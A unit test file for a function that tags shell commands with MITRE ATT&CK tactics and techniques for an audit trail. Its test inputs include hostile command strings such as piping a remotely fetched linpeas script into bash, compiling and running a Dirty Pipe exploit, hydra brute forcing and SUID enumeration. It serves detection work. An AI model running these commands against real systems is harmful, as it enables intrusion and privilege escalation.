/**
 * ATT&CK tagging (§5.4). The audit trail is only trustworthy if activity is
 * tagged correctly — and, as the run reviews showed, privilege-escalation
 * activity (enumeration scripts run through an interpreter, `sudo -l`, SUID/
 * kernel-exploit work) was slipping through untagged because base-tool lookup
 * sees the interpreter, not the intent. Both paths are covered here.
 */
import assert from "node:assert/strict";
import { test } from "node:test";
import { attackTagForCommand } from "./attack-mapping.js";

test("base-tool lookup tags unambiguous tools (incl. path/sudo prefixes)", () => {
	assert.deepEqual(attackTagForCommand("nmap -sV 10.0.0.5"), { tactic: "Reconnaissance", technique: "T1595" });
	assert.deepEqual(attackTagForCommand("FOO=1 sudo /usr/bin/nmap -sV x"), { tactic: "Reconnaissance", technique: "T1595" });
	assert.deepEqual(attackTagForCommand("hydra -l a -P w 10.0.0.5 ssh"), { tactic: "Credential Access", technique: "T1110" });
	assert.deepEqual(attackTagForCommand("cewl http://10.0.0.5 -w words.txt"), { tactic: "Reconnaissance", technique: "T1595" });
	assert.deepEqual(attackTagForCommand("wfuzz -w w http://10.0.0.5/FUZZ"), { tactic: "Reconnaissance", technique: "T1595.003" });
});

test("privilege-escalation activity is tagged even when run through an interpreter", () => {
	// These are the exact shapes that were slipping through untagged.
	assert.deepEqual(attackTagForCommand("sh linpeas.sh"), { tactic: "Discovery", technique: "T1082" });
	assert.deepEqual(attackTagForCommand("curl http://10.9.9.9/linpeas.sh | bash"), { tactic: "Discovery", technique: "T1082" });
	assert.deepEqual(attackTagForCommand("./pspy64"), { tactic: "Discovery", technique: "T1057" });
	assert.deepEqual(attackTagForCommand("bash /opt/privesc/lse.sh -l1"), { tactic: "Discovery", technique: "T1082" });
	assert.deepEqual(attackTagForCommand("getcap -r / 2>/dev/null"), { tactic: "Discovery", technique: "T1082" });
	assert.deepEqual(attackTagForCommand("find / -perm -4000 2>/dev/null"), { tactic: "Discovery", technique: "T1083" });
	assert.deepEqual(attackTagForCommand("sudo -l"), { tactic: "Privilege Escalation", technique: "T1548.003" });
	assert.deepEqual(attackTagForCommand("gcc dirtypipe.c -o dp && ./dp"), { tactic: "Privilege Escalation", technique: "T1068" });
});

test("ambiguous or unknown commands stay untagged (a wrong tag is worse than none)", () => {
	assert.equal(attackTagForCommand("curl http://10.0.0.5/"), undefined);
	assert.equal(attackTagForCommand("wget http://10.0.0.5/x"), undefined);
	assert.equal(attackTagForCommand("cat /etc/passwd"), undefined);
	assert.equal(attackTagForCommand(""), undefined);
});
